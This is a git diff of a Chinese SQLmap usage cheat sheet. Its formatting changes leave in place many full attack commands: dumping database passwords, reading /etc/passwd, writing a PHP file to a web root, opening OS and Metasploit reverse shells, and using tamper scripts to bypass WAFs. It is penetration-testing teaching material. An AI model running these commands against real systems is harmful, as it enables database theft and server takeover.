@@ -1,146 +1,146 @@
 ---
 category: 网络安全
-tag: 
-    - 工具
-    - SQLmap
+tag:
+  - 工具
+  - SQLmap
 ---
 
-# SQLmap使用手册小结
+# SQLmap 使用手册小结
+
+<!-- more -->
 
 ![SQLmap](./img/SQLmap/SQLmap.png)
-
-
 
 ## 1. 基本操作笔记
 
 ```
 
--u  #注入点 
--f  #指纹判别数据库类型 
--b  #获取数据库版本信息 
--p  #指定可测试的参数(?page=1&id=2 -p "page,id") 
--D ""  #指定数据库名 
--T ""  #指定表名 
--C ""  #指定字段 
--s ""  #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s "xx.log"　　恢复:-s "xx.log" --resume) 
---level=(1-5) #要执行的测试水平等级，默认为1 
---risk=(0-3)  #测试执行的风险等级，默认为1 
---time-sec=(2,5) #延迟响应，默认为5 
---data #通过POST发送数据 
---columns        #列出字段 
---current-user   #获取当前用户名称 
---current-db     #获取当前数据库名称 
---users          #列数据库所有用户 
---passwords      #数据库用户所有密码 
---privileges     #查看用户权限(--privileges -U root) 
--U               #指定数据库用户 
---dbs            #列出所有数据库 
---tables -D ""   #列出指定数据库中的表 
---columns -T "user" -D "mysql"      #列出mysql数据库中的user表的所有字段 
---dump-all            #列出所有数据库所有表 
---exclude-sysdbs      #只列出用户自己新建的数据库和表 
---dump -T "" -D "" -C ""   #列出指定数据库的表的字段的数据(--dump -T users -D master -C surname) 
---dump -T "" -D "" --start 2 --top 4  # 列出指定数据库的表的2-4字段的数据 
---dbms    #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) 
---os      #指定系统(Linux,Windows) 
--v  #详细的等级(0-6) 
-    0：只显示Python的回溯，错误和关键消息。 
-    1：显示信息和警告消息。 
-    2：显示调试消息。 
-    3：有效载荷注入。 
-    4：显示HTTP请求。 
-    5：显示HTTP响应头。 
-    6：显示HTTP响应页面的内容 
---privileges  #查看权限 
---is-dba      #是否是数据库管理员 
---roles       #枚举数据库用户角色 
---udf-inject  #导入用户自定义函数（获取系统权限） 
---union-check  #是否支持union 注入 
---union-cols #union 查询表记录 
---union-test #union 语句测试 
---union-use  #采用union 注入 
---union-tech orderby #union配合order by 
---data "" #POST方式提交数据(--data "page=1&id=2") 
---cookie "用;号分开"      #cookie注入(--cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”) 
---referer ""     #使用referer欺骗(--referer "http://www.baidu.com") 
---user-agent ""  #自定义user-agent 
---proxy "http://127.0.0.1:8118" #代理注入 
---string=""    #指定关键词,字符串匹配. 
---threads 　　  #采用多线程(--threads 3) 
---sql-shell    #执行指定sql命令 
---sql-query    #执行指定的sql语句(--sql-query "SELECT password FROM mysql.user WHERE user = 'root' LIMIT 0, 1" ) 
---file-read    #读取指定文件 
---file-write   #写入本地文件(--file-write /test/test.txt --file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt) 
---file-dest    #要写入的文件绝对路径 
---os-cmd=id    #执行系统命令 
---os-shell     #系统交互shell 
---os-pwn       #反弹shell(--os-pwn --msf-path=/opt/framework/msf3/) 
---msf-path=    #matesploit绝对路径(--msf-path=/opt/framework/msf3/) 
---os-smbrelay  # 
---os-bof       # 
---reg-read     #读取win系统注册表 
---priv-esc     # 
---time-sec=    #延迟设置 默认--time-sec=5 为5秒 
--p "user-agent" --user-agent "sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)"  #指定user-agent注入 
---eta          #盲注 
+-u  #注入点
+-f  #指纹判别数据库类型
+-b  #获取数据库版本信息
+-p  #指定可测试的参数(?page=1&id=2 -p "page,id")
+-D ""  #指定数据库名
+-T ""  #指定表名
+-C ""  #指定字段
+-s ""  #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s "xx.log"　　恢复:-s "xx.log" --resume)
+--level=(1-5) #要执行的测试水平等级，默认为1
+--risk=(0-3)  #测试执行的风险等级，默认为1
+--time-sec=(2,5) #延迟响应，默认为5
+--data #通过POST发送数据
+--columns        #列出字段
+--current-user   #获取当前用户名称
+--current-db     #获取当前数据库名称
+--users          #列数据库所有用户
+--passwords      #数据库用户所有密码
+--privileges     #查看用户权限(--privileges -U root)
+-U               #指定数据库用户
+--dbs            #列出所有数据库
+--tables -D ""   #列出指定数据库中的表
+--columns -T "user" -D "mysql"      #列出mysql数据库中的user表的所有字段
+--dump-all            #列出所有数据库所有表
+--exclude-sysdbs      #只列出用户自己新建的数据库和表
+--dump -T "" -D "" -C ""   #列出指定数据库的表的字段的数据(--dump -T users -D master -C surname)
+--dump -T "" -D "" --start 2 --top 4  # 列出指定数据库的表的2-4字段的数据
+--dbms    #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB)
+--os      #指定系统(Linux,Windows)
+-v  #详细的等级(0-6)
+    0：只显示Python的回溯，错误和关键消息。
+    1：显示信息和警告消息。
+    2：显示调试消息。
+    3：有效载荷注入。
+    4：显示HTTP请求。
+    5：显示HTTP响应头。
+    6：显示HTTP响应页面的内容
+--privileges  #查看权限
+--is-dba      #是否是数据库管理员
+--roles       #枚举数据库用户角色
+--udf-inject  #导入用户自定义函数（获取系统权限）
+--union-check  #是否支持union 注入
+--union-cols #union 查询表记录
+--union-test #union 语句测试
+--union-use  #采用union 注入
+--union-tech orderby #union配合order by
+--data "" #POST方式提交数据(--data "page=1&id=2")
+--cookie "用;号分开"      #cookie注入(--cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”)
+--referer ""     #使用referer欺骗(--referer "http://www.baidu.com")
+--user-agent ""  #自定义user-agent
+--proxy "http://127.0.0.1:8118" #代理注入
+--string=""    #指定关键词,字符串匹配.
+--threads 　　  #采用多线程(--threads 3)
+--sql-shell    #执行指定sql命令
+--sql-query    #执行指定的sql语句(--sql-query "SELECT password FROM mysql.user WHERE user = 'root' LIMIT 0, 1" )
+--file-read    #读取指定文件
+--file-write   #写入本地文件(--file-write /test/test.txt --file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt)
+--file-dest    #要写入的文件绝对路径
+--os-cmd=id    #执行系统命令
+--os-shell     #系统交互shell
+--os-pwn       #反弹shell(--os-pwn --msf-path=/opt/framework/msf3/)
+--msf-path=    #matesploit绝对路径(--msf-path=/opt/framework/msf3/)
+--os-smbrelay  #
+--os-bof       #
+--reg-read     #读取win系统注册表
+--priv-esc     #
+--time-sec=    #延迟设置 默认--time-sec=5 为5秒
+-p "user-agent" --user-agent "sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)"  #指定user-agent注入
+--eta          #盲注
 /pentest/database/sqlmap/txt/
-common-columns.txt　　字段字典　　　 
-common-outputs.txt 
-common-tables.txt      表字典 
-keywords.txt 
-oracle-default-passwords.txt 
-user-agents.txt 
-wordlist.txt 
+common-columns.txt　　字段字典　　　
+common-outputs.txt
+common-tables.txt      表字典
+keywords.txt
+oracle-default-passwords.txt
+user-agents.txt
+wordlist.txt
 ```
 
-## 2. 常用语句 
+## 2. 常用语句
 
 ```
-1./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db --users --passwords --dbs -v 0 
-2./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --passwords -U root --union-use -v 2 
-3./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -T users -C username -D userdb --start 2 --stop 3 -v 2 
-4./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -C "user,pass"  -v 1 --exclude-sysdbs 
-5./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --sql-shell -v 2 
-6./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-read "c:\boot.ini" -v 2 
-7./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-write /test/test.txt --file-dest /var/www/html/1.txt -v 2 
-8./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-cmd "id" -v 1 
-9./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-shell --union-use -v 2 
-10./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 --priv-esc -v 1 
-11./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 -v 1 
-12./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-bof --msf-path=/opt/framework/msf3 -v 1 
-13./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --reg-add --reg-key="HKEY_LOCAL_NACHINE\SOFEWARE\sqlmap" --reg-value=Test --reg-type=REG_SZ --reg-data=1 
-14./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --eta 
+1./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db --users --passwords --dbs -v 0
+2./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --passwords -U root --union-use -v 2
+3./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -T users -C username -D userdb --start 2 --stop 3 -v 2
+4./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -C "user,pass"  -v 1 --exclude-sysdbs
+5./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --sql-shell -v 2
+6./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-read "c:\boot.ini" -v 2
+7./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-write /test/test.txt --file-dest /var/www/html/1.txt -v 2
+8./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-cmd "id" -v 1
+9./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-shell --union-use -v 2
+10./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 --priv-esc -v 1
+11./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 -v 1
+12./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-bof --msf-path=/opt/framework/msf3 -v 1
+13./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --reg-add --reg-key="HKEY_LOCAL_NACHINE\SOFEWARE\sqlmap" --reg-value=Test --reg-type=REG_SZ --reg-data=1
+14./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --eta
 15./sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1" -p id --prefix "')" --suffix "AND ('abc'='abc"
 16./sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1" --auth-type Basic --auth-cred "testuser:testpass"
 17./sqlmap.py -l burp.log --scope="(www)?\.target\.(com|net|org)"
-18./sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_int.php?id=1" --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3 
-19./sqlmap.py -u "http://192.168.136.131/sqlmap/mssql/get_int.php?id=1" --sql-query "SELECT 'foo'" -v 1 
-20./sqlmap.py -u "http://192.168.136.129/mysql/get_int_4.php?id=1" --common-tables -D testdb --banner 
+18./sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_int.php?id=1" --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3
+19./sqlmap.py -u "http://192.168.136.131/sqlmap/mssql/get_int.php?id=1" --sql-query "SELECT 'foo'" -v 1
+20./sqlmap.py -u "http://192.168.136.129/mysql/get_int_4.php?id=1" --common-tables -D testdb --banner
 21./sqlmap.py -u "http://192.168.136.129/mysql/get_int_4.php?id=1" --cookie="PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low" --string='xx' --dbs --level=3 -p "uid"
 ```
 
-## 3. 简单的注入流程 
+## 3. 简单的注入流程
 
 ```
-1.读取数据库版本，当前用户，当前数据库 
-sqlmap -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db -v 1 
-2.判断当前数据库用户权限 
-sqlmap -u http://www.xxxxx.com/test.php?p=2 --privileges -U 用户名 -v 1 
-sqlmap -u http://www.xxxxx.com/test.php?p=2 --is-dba -U 用户名 -v 1 
-3.读取所有数据库用户或指定数据库用户的密码 
-sqlmap -u http://www.xxxxx.com/test.php?p=2 --users --passwords -v 2 
-sqlmap -u http://www.xxxxx.com/test.php?p=2 --passwords -U root -v 2 
-4.获取所有数据库 
-sqlmap -u http://www.xxxxx.com/test.php?p=2 --dbs -v 2 
-5.获取指定数据库中的所有表 
-sqlmap -u http://www.xxxxx.com/test.php?p=2 --tables -D mysql -v 2 
-6.获取指定数据库名中指定表的字段 
-sqlmap -u http://www.xxxxx.com/test.php?p=2 --columns -D mysql -T users -v 2 
-7.获取指定数据库名中指定表中指定字段的数据 
-sqlmap -u http://www.xxxxx.com/test.php?p=2 --dump -D mysql -T users -C "username,password" -s "sqlnmapdb.log" -v 2 
-8.file-read读取web文件 
-sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-read "/etc/passwd" -v 2 
-9.file-write写入文件到web 
+1.读取数据库版本，当前用户，当前数据库
+sqlmap -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db -v 1
+2.判断当前数据库用户权限
+sqlmap -u http://www.xxxxx.com/test.php?p=2 --privileges -U 用户名 -v 1
+sqlmap -u http://www.xxxxx.com/test.php?p=2 --is-dba -U 用户名 -v 1
+3.读取所有数据库用户或指定数据库用户的密码
+sqlmap -u http://www.xxxxx.com/test.php?p=2 --users --passwords -v 2
+sqlmap -u http://www.xxxxx.com/test.php?p=2 --passwords -U root -v 2
+4.获取所有数据库
+sqlmap -u http://www.xxxxx.com/test.php?p=2 --dbs -v 2
+5.获取指定数据库中的所有表
+sqlmap -u http://www.xxxxx.com/test.php?p=2 --tables -D mysql -v 2
+6.获取指定数据库名中指定表的字段
+sqlmap -u http://www.xxxxx.com/test.php?p=2 --columns -D mysql -T users -v 2
+7.获取指定数据库名中指定表中指定字段的数据
+sqlmap -u http://www.xxxxx.com/test.php?p=2 --dump -D mysql -T users -C "username,password" -s "sqlnmapdb.log" -v 2
+8.file-read读取web文件
+sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-read "/etc/passwd" -v 2
+9.file-write写入文件到web
 sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-write /localhost/mm.php --file使用sqlmap绕过防火墙进行注入测试：
 ```
 
@@ -171,25 +171,25 @@ sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-write /localhost/mm.php --fil
 
 可以提供一个简单的`URL，Burp`或`WebScarab`请求日志文件，文本文档中的完整`http`请求或者`Google`的搜索，匹配出结果页面，也可以自己定义一个正则来判断那个地址去测试。测试`GET`参数，`POST`参数，`HTTP Cookie`参数，`HTTP User-Agent`头和`HTTP Referer`头来确认是否有`SQL`注入，它也可以指定用逗号分隔的列表的具体参数来测试。可以设定`HTTP(S)`请求的并发数，来提高盲注时的效率。
 
-**GET方式**
+**GET 方式**
 
 ```
 sqlmap -u "url" //这个URL必须含？
 ```
 
-**POST方式**
+**POST 方式**
 
 ```
 sqlmap -u http://testasp.vulnweb.com/Login.asp --data "tfUName=1&tfUPass=1"
 ```
 
-**cookie注入**
+**cookie 注入**
 
 ```
 sqlmap -u "url" --cookie "chsadj" --level 2 //这里的URL去掉？及其后的内容，并将它们放在cookie的内容里面
 ```
 
-**tamper方式**
+**tamper 方式**
 
 ```
 sqlmap -u "url" -v 3 --batch --tamper "sac.py"  //temper后面的插件可以去sql安装目录查找
@@ -207,7 +207,7 @@ sqlmap -u http://testasp.vulnweb.com/Login.asp --forms
 Sqlmap –u “url” --delay 2
 ```
 
-**频率3次**
+**频率 3 次**
 
 ```
 Sqlmap –u “url” --safe-freq 3
@@ -282,7 +282,7 @@ sqlmap -u "url" --os-shell  //进入数据库自带的shell
 -m 1.txt            对于多个URL，可以一排一个写入文件后加载
 --force-ssl         对于使用SSL的URL要在后面加上这个参数
 --data              对于使用post方法，可以将参数写在data后面
---param-del=""          
+--param-del=""
 --cookie=""  level 2        对于需要验证才能访问的URL，可以加上cookie值验证，如果要检测cookie是否有注入漏洞，level要高于1
 --random-agent          使用随机的user-agent
 --user-agent=""  level 3    指定user-agent，如要检测它是否有漏洞level要高于2
@@ -327,9 +327,9 @@ sqlmap -l 2.log --scope="(19)?\.168\.20\.(1|11|111)"        同上，筛选19*.1
 --code              当状态代码为*时为真
 --text-only         页面含有*时为真
 --titles            页面标题为*时为真
---techniques 
+--techniques
 B E U S T           使用什么检查技术，默认所有，这里分别是基于布尔的盲注，基于错误的判断，联合查询，堆积，基于时间的查询
---time-sec          
+--time-sec
 --union-cols            联合查询第几列到第几列
 --union-char            用select null,1:2  这种，可能会出错，就讲这个null换成其他数字占位
 --second-order          当注入后在第二个页面显示错误信息，这里就接上显示错误信息的地方
@@ -359,8 +359,6 @@ B E U S T           使用什么检查技术，默认所有，这里分别是基
 --purge-out 清除输出内容
 ```
 
-
-
 #### 用来连接数据库
 
 这是一个比较实用的功能，用来连接数据库格式为
@@ -379,11 +377,11 @@ B E U S T           使用什么检查技术，默认所有，这里分别是基
 6. 同时显示HTTP响应页面。
 ```
 
-可以通过学习`sqlmap`的`payload`来学习`sql`注入，这时需要使用3级。
+可以通过学习`sqlmap`的`payload`来学习`sql`注入，这时需要使用 3 级。
 
 #### 获取目标方式
 
-**目标URL**
+**目标 URL**
 
 参数：`-u`或者`–url`
 
@@ -411,7 +409,7 @@ www.target2.com/vuln2.asp?id=1
 www.target3.com/vuln3/id/1*
 ```
 
-**从文件中加载HTTP请求**
+**从文件中加载 HTTP 请求**
 
 参数：`-r`
 
@@ -429,9 +427,9 @@ User-Agent: Mozilla/4.0
 id=1
 ```
 
-当请求是HTTPS的时候你需要配合这个`–force-ssl`参数来使用，或者你可以在Host头后面加上:`443`
+当请求是 HTTPS 的时候你需要配合这个`–force-ssl`参数来使用，或者你可以在 Host 头后面加上:`443`
 
-**处理Google的搜索结果**
+**处理 Google 的搜索结果**
 
 参数：`-g`
 
@@ -443,15 +441,15 @@ id=1
 python sqlmap.py -g "inurl:\".php?id=1\""
 ```
 
-此外可以使用-c参数加载sqlmap.conf文件里面的相关配置。
+此外可以使用-c 参数加载 sqlmap.conf 文件里面的相关配置。
 
 #### 请求
 
-**http数据**
+**http 数据**
 
 参数：`–data`
 
-此参数是把数据以`POST`方式提交，`sqlmap`会像检测GET参数一样检测`POST`的参数。
+此参数是把数据以`POST`方式提交，`sqlmap`会像检测 GET 参数一样检测`POST`的参数。
 
 例子：
 
@@ -472,14 +470,14 @@ python sqlmap.py -u "http://www.target.com/vuln.php" --data="query=foobar;id=1"
 --param-del=";" -f --banner --dbs --users
 ```
 
-**HTTP cookie头**
+**HTTP cookie 头**
 
 参数：`–cookie,–load-cookies,–drop-set-cookie`
 
 这个参数在以下两个方面很有用：
 
-1. web应用需要登陆的时候。
-2. 你想要在这些头参数中测试SQL注入时。
+1. web 应用需要登陆的时候。
+2. 你想要在这些头参数中测试 SQL 注入时。
 
 可以通过抓包把`cookie`获取到，复制出来，然后加到`–cookie`参数里。
 
@@ -489,13 +487,13 @@ python sqlmap.py -u "http://www.target.com/vuln.php" --data="query=foobar;id=1"
 
 当你使用`–cookie`参数时，当返回一个`Set-Cookie`头的时候，`sqlmap`会询问你用哪个`cookie`来继续接下来的请求。
 
-当`–level`的参数设定为2或者2以上的时候，`sqlmap`会尝试注入`Cookie`参数。
+当`–level`的参数设定为 2 或者 2 以上的时候，`sqlmap`会尝试注入`Cookie`参数。
 
-**HTTP User-Agent头**
+**HTTP User-Agent 头**
 
 参数：`–user-agent,–random-agent`
 
-默认情况下`sqlmap`的`HTTP`请求头中`User-Agen`t值是：
+默认情况下`sqlmap`的`HTTP`请求头中`User-Agen`t 值是：
 
 ```
 sqlmap/1.0-dev-xxxxxxx (http://sqlmap.org)
@@ -505,25 +503,25 @@ sqlmap/1.0-dev-xxxxxxx (http://sqlmap.org)
 
 可以使用`–user-anget`参数来修改，同时也可以使用`–random-agnet`参数来随机的从`./txt/user-agents.txt`中获取。
 
-当`–level`参数设定为3或者3以上的时候，会尝试对`User-Angent`进行注入。
+当`–level`参数设定为 3 或者 3 以上的时候，会尝试对`User-Angent`进行注入。
 
-**HTTP Referer头**
+**HTTP Referer 头**
 
 参数：`–referer`
 
-`sqlmap`可以在请求中伪造HTTP中的`referer`，当`–level`参数设定为3或者3以上的时候会尝试对referer注入。
+`sqlmap`可以在请求中伪造 HTTP 中的`referer`，当`–level`参数设定为 3 或者 3 以上的时候会尝试对 referer 注入。
 
-**额外的HTTP头**
+**额外的 HTTP 头**
 
 参数：`–headers`
 
-可以通过`–headers`参数来增加额外的http头
+可以通过`–headers`参数来增加额外的 http 头
 
-**HTTP认证保护**
+**HTTP 认证保护**
 
 参数：`–auth-type,–auth-cred`
 
-这些参数可以用来登陆HTTP的认证保护支持三种方式：
+这些参数可以用来登陆 HTTP 的认证保护支持三种方式：
 
 ```
 1. Basic
@@ -540,13 +538,13 @@ python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1"
 --auth-type Basic --auth-cred "testuser:testpass"
 ```
 
-**HTTP协议的证书认证**
+**HTTP 协议的证书认证**
 
 参数：`–auth-cert`
 
-当Web服务器需要客户端证书进行身份验证时，需要提供两个文件:`key_file，cert_file`。
+当 Web 服务器需要客户端证书进行身份验证时，需要提供两个文件:`key_file，cert_file`。
 
-`key_file`是格式为PEM文件，包含着你的私钥，`cert_file`是格式为`PEM`的连接文件。
+`key_file`是格式为 PEM 文件，包含着你的私钥，`cert_file`是格式为`PEM`的连接文件。
 
 **HTTP(S)代理**
 
@@ -558,11 +556,11 @@ python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1"
 
 `–ignore-proxy`拒绝使用本地局域网的`HTTP(S)`代理。
 
-**HTTP请求延迟**
+**HTTP 请求延迟**
 
 参数：`–delay`
 
-可以设定两个`HTTP(S)`请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的。
+可以设定两个`HTTP(S)`请求间的延迟，设定为 0.5 的时候是半秒，默认是没有延迟的。
 
 **设定超时时间**
 
@@ -574,7 +572,7 @@ python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1"
 
 参数：`–retries`
 
-当`HTTP(S)`超时时，可以设定重新尝试连接次数，默认是3次。
+当`HTTP(S)`超时时，可以设定重新尝试连接次数，默认是 3 次。
 
 **设定随机改变的参数值**
 
@@ -596,24 +594,24 @@ python sqlmap.py -l burp.log --scope="(www)?\.target\.(com\|net\|org)"
 
 参数：`–safe-url,–safe-freq`
 
-有的web应用程序会在你多次访问错误的请求时屏蔽掉你以后的所有请求，这样在sqlmap进行探测或者注入的时候可能造成错误请求而触发这个策略，导致以后无法进行。
+有的 web 应用程序会在你多次访问错误的请求时屏蔽掉你以后的所有请求，这样在 sqlmap 进行探测或者注入的时候可能造成错误请求而触发这个策略，导致以后无法进行。
 
 **绕过这个策略有两种方式：**
 
 1. `--safe-url`：提供一个安全不错误的连接，每隔一段时间都会去访问一下。
 2. `--safe-freq`：提供一个安全不错误的连接，一段频率后会访问一次。
 
-**关掉URL参数值编码**
+**关掉 URL 参数值编码**
 
 参数：`–skip-urlencode`
 
-根据参数位置，他的值默认将会被URL编码，但是有些时候后端的web服务器不遵守RFC标准，只接受不经过`URL`编码的值，这时候就需要用`–skip-urlencode`参数。
+根据参数位置，他的值默认将会被 URL 编码，但是有些时候后端的 web 服务器不遵守 RFC 标准，只接受不经过`URL`编码的值，这时候就需要用`–skip-urlencode`参数。
 
-**每次请求时候执行自定义的python代码**
+**每次请求时候执行自定义的 python 代码**
 
 参数：`–eval`
 
-在有些时候，需要根据某个参数的变化，而修改另个一参数，才能形成正常的请求，这时可以用–eval参数在每次请求时根据所写python代码做完修改后请求。
+在有些时候，需要根据某个参数的变化，而修改另个一参数，才能形成正常的请求，这时可以用–eval 参数在每次请求时根据所写 python 代码做完修改后请求。
 
 例子：
 
@@ -623,7 +621,7 @@ python sqlmap.py -u
 --eval="import hashlib;hash=hashlib.md5(id).hexdigest()"
 ```
 
-上面的请求就是每次请求时根据id参数值，做一次`md5`后作为`hash`参数的值。
+上面的请求就是每次请求时根据 id 参数值，做一次`md5`后作为`hash`参数的值。
 
 #### 注入
 
@@ -639,7 +637,7 @@ python sqlmap.py -u
 
 如：`–skip=”user-angent.referer”`
 
-对于伪静态链接，可以在想测试的参数后面加*，它会测试那个指定的参数
+对于伪静态链接，可以在想测试的参数后面加\*，它会测试那个指定的参数
 
 例如：
 
@@ -676,7 +674,7 @@ Access、SQLite、Firebird、Sybase、SAP MaxDB、DB2
 
 原因同上，可以指定`id=13`把原来的`id=-13`的报错改成`id=13 AND 18=19`。
 
-**注入payload**
+**注入 payload**
 
 参数：`–prefix,–suffix`
 
@@ -695,7 +693,7 @@ python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id
 "’)" --suffix "AND (’abc’=’abc"
 ```
 
-这样执行的SQL语句变成：
+这样执行的 SQL 语句变成：
 
 ```
 $query = "SELECT * FROM users WHERE id=(’1’) <PAYLOAD> AND (’abc’=’abc’)
@@ -706,7 +704,7 @@ LIMIT 0, 1";
 
 参数：`–tamper`
 
-`sqlmap`除了使用`CHAR()`函数来防止出现单引号之外没有对注入的数据修改，你可以使用`–tamper`参数对数据做修改来绕过WAF等设备。
+`sqlmap`除了使用`CHAR()`函数来防止出现单引号之外没有对注入的数据修改，你可以使用`–tamper`参数对数据做修改来绕过 WAF 等设备。
 下面是一个`tamper`脚本的格式：
 
 ```
@@ -760,9 +758,9 @@ clause' injectable
 
 共有五个等级，默认为`1，sqlmap`使用的`payload`可以在`xml/payloads.xml`中看到，你也可以根据相应的格式添加自己的`payload`。
 
-这个参数不仅影响使用哪些`payload`同时也会影响测试的注入点，`GET`和`POST`的数据都会测试，`HTTP Cookie`在`level`为2的时候
+这个参数不仅影响使用哪些`payload`同时也会影响测试的注入点，`GET`和`POST`的数据都会测试，`HTTP Cookie`在`level`为 2 的时候
 
-就会测试，`HTTP User-Agent/Referer`头在`level`为3的时候就会测试。
+就会测试，`HTTP User-Agent/Referer`头在`level`为 3 的时候就会测试。
 
 总之在你不确定哪个`payload`或者参数为注入点的时候，为了保证全面性，建议使用高的`level`值。
 
@@ -770,9 +768,9 @@ clause' injectable
 
 参数：`–risk`
 
-共有四个风险等级，默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。
+共有四个风险等级，默认是 1 会测试大部分的测试语句，2 会增加基于事件的测试语句，3 会增加 OR 语句的 SQL 注入测试。
 
-在有些时候，例如在UPDATE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。
+在有些时候，例如在 UPDATE 的语句中，注入一个 OR 的测试语句，可能导致更新的整个表，可能造成很大的风险。
 
 测试的语句同样可以在`xml/payloads.xml`中找到，你也可以自行添加`payload`。
 
@@ -780,19 +778,19 @@ clause' injectable
 
 参数：`–string,–not-string,–regexp,–code`
 
-默认情况下sqlmap通过判断返回页面的不同来判断真假，但有时候这会产生误差，因为有的页面在每次刷新的时候都会返回不同的代码，
+默认情况下 sqlmap 通过判断返回页面的不同来判断真假，但有时候这会产生误差，因为有的页面在每次刷新的时候都会返回不同的代码，
 
-比如页面当中包含一个动态的广告或者其他内容，这会导致sqlmap的误判。此时用户可以提供一个字符串或者一段正则匹配，
+比如页面当中包含一个动态的广告或者其他内容，这会导致 sqlmap 的误判。此时用户可以提供一个字符串或者一段正则匹配，
 
-在原始页面与真条件下的页面都存在的字符串，而错误页面中不存在（使用–string参数添加字符串，–regexp添加正则），
+在原始页面与真条件下的页面都存在的字符串，而错误页面中不存在（使用–string 参数添加字符串，–regexp 添加正则），
 
-同时用户可以提供一段字符串在原始页面与真条件下的页面都不存在的字符串，而错误页面中存在的字符串（–not-string添加）。
+同时用户可以提供一段字符串在原始页面与真条件下的页面都不存在的字符串，而错误页面中存在的字符串（–not-string 添加）。
 
-用户也可以提供真与假条件返回的HTTP状态码不一样来注入，例如，响应200的时候为真，响应401的时候为假，可以添加参数–code=200。
+用户也可以提供真与假条件返回的 HTTP 状态码不一样来注入，例如，响应 200 的时候为真，响应 401 的时候为假，可以添加参数–code=200。
 
 参数：`–text-only,–titles`
 
-有些时候用户知道真条件下的返回页面与假条件下返回页面是不同位置在哪里可以使用–text-only（HTTP响应体中不同）–titles（HTML的title标签中不同）。
+有些时候用户知道真条件下的返回页面与假条件下返回页面是不同位置在哪里可以使用–text-only（HTTP 响应体中不同）–titles（HTML 的 title 标签中不同）。
 
 #### 注入技术
 
@@ -820,37 +818,37 @@ T: Time-based blind SQL injection（基于时间延迟注入）
 
 参数：`–time-sec`
 
-当使用继续时间的盲注时，时刻使用`–time-sec`参数设定延时时间，默认是5秒。
+当使用继续时间的盲注时，时刻使用`–time-sec`参数设定延时时间，默认是 5 秒。
 
-**设定UNION查询字段数**
+**设定 UNION 查询字段数**
 
 参数：`–union-cols`
 
-默认情况下sqlmap测试UNION查询注入会测试1-10个字段数，当–level为5的时候他会增加测试到50个字段数。
+默认情况下 sqlmap 测试 UNION 查询注入会测试 1-10 个字段数，当–level 为 5 的时候他会增加测试到 50 个字段数。
 
-设定`–union-cols`的值应该是一段整数，如：12-16，是测试12-16个字段数。
+设定`–union-cols`的值应该是一段整数，如：12-16，是测试 12-16 个字段数。
 
-**设定UNION查询使用的字符**
+**设定 UNION 查询使用的字符**
 
 参数：`–union-char`
 
-默认情况下`sqlmap`针对`UNION`查询的注入会使用NULL字符，但是有些情况下会造成页面返回失败，而一个随机整数是成功的，
